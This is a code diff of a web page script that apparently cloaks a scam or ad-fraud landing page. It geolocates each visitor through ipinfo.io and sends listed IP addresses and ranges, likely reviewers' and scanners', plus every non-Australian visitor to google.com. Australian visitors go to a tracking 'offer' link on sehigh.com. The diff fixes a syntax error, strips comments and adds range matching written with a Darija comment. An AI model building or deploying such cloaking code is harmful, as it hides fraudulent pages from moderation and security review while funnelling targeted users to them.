@@ -7,49 +7,55 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.0/jquery.js" integrity="sha512-cEgdeh0IWe1pUYypx4mYPjDxGB/tyIORwjxzKrnoxcif2ZxI7fw81pZWV0lGnPWLrfIHGA7qc964MnRjyCYmEQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
 
     <script>
-        // Define the allowed countries (ISO 3166-1 alpha-2 country codes)
         const allowedCountries = ['AU']; // Only allow Australia (AU)
 
-        // Define blocked IP addresses
         const blockedIPs = [
-      "185.18.222.147", "103.17.196.155", "198.44.133.53", "138.199.22.183", "106.161.65.206",
-      "54.200.5.221", "35.89.14.236", "104.210.79.75", "35.88.70.185", "96.0.0.81",
-      "20.28.16.4", "104.28.108.0", "16.50.232.14", "173.239.194.27", "217.64.126.104",
-      "104.28.35.3", "104.28.35.4", "68.218.165.136", "173.239.194.229", "68.218.165.140",
-      "52.243.103.225", "48.215.3.146", "149.88.101.20", "217.64.126.150", "104.28.125.4",
-      "154.16.81.84", "54.156.251.192", "34.235.48.77", "149.154.161.xxx", 149.154.161", "212.143.94.254",
-            "212.6.82.xxx", "40.80.158.10", "89.248.171.xxx", "85.208.139.205", "138.199.59.xxx", "128.90.177.209", 
-             "128.90.63.191", "74.80.181.154", "212.102.63.xxx", "82.102.31.156", "31.217.248.xxx", "31.217.248.xxx",
-              "159.148.128.163", "85.254.40.226" 
+            "185.18.222.147", "103.17.196.155", "198.44.133.53", "138.199.22.183", "106.161.65.206",
+            "54.200.5.221", "35.89.14.236", "104.210.79.75", "35.88.70.185", "96.0.0.81",
+            "20.28.16.4", "104.28.108.0", "16.50.232.14", "173.239.194.27", "217.64.126.104",
+            "104.28.35.3", "104.28.35.4", "68.218.165.136", "173.239.194.229", "68.218.165.140",
+            "52.243.103.225", "48.215.3.146", "149.88.101.20", "217.64.126.150", "104.28.125.4",
+            "154.16.81.84", "54.156.251.192", "34.235.48.77", "149.154.161.xxx", 
+            "212.143.94.254", "212.6.82.xxx", "40.80.158.10", "89.248.171.xxx", "85.208.139.205",
+            "138.199.59.xxx", "128.90.177.209", "128.90.63.191", "74.80.181.154", "212.102.63.xxx",
+            "82.102.31.156", "31.217.248.xxx", "159.148.128.163", "85.254.40.226"
         ];
 
-
+        // دالة كتشيك واش الـIP محظور حتى بالرنج
+        function isIPBlocked(ip) {
+            return blockedIPs.some(blocked => {
+                if (blocked.includes("xxx")) {
+                    const prefix = blocked.replace(".xxx", "");
+                    return ip.startsWith(prefix);
+                } else {
+                    return ip === blocked;
+                }
+            });
+        }
 
         $.get('https://ipinfo.io/json', function(data) {  
-            const ipAddress = data.ip;  // Extract the IP address  
-            const country = data.country;  // Extract the country code  
+            const ipAddress = data.ip;  
+            const country = data.country;  
 
             console.log("IP Address:", ipAddress);  
             console.log("Country:", country);  
 
-            // Block IP addresses
-            if (blockedIPs.includes(ipAddress)) {
+            if (isIPBlocked(ipAddress)) {
                 console.log("Blocked IP detected:", ipAddress);
-                window.location.replace("https://google.com"); // Redirect immediately without delay
+                window.location.replace("https://google.com");
                 return;
             }
 
-            // Check if the country is allowed
-            if (allowedCountries.includes(country)) {    
+            if (allowedCountries.includes(country)) {
                 console.log("Access allowed for country:", country);    
-                window.location.replace("https://www.sehigh.com/DZRZX6W/2DZTNR69/"); // Redirect to the offer for allowed countries
-            } else {    
+                window.location.replace("https://www.sehigh.com/DZRZX6W/2DZTNR69/");
+            } else {
                 console.log("Access denied for country:", country);    
-                window.location.replace("https://google.com"); // Redirect to Google for other countries
+                window.location.replace("https://google.com");
             }
         }).fail(function(error) {  
             console.error('Error:', error);  
-            window.location.replace("https://google.com"); // If there's an error, redirect to Google
+            window.location.replace("https://google.com");
         });
     </script>
 </head>
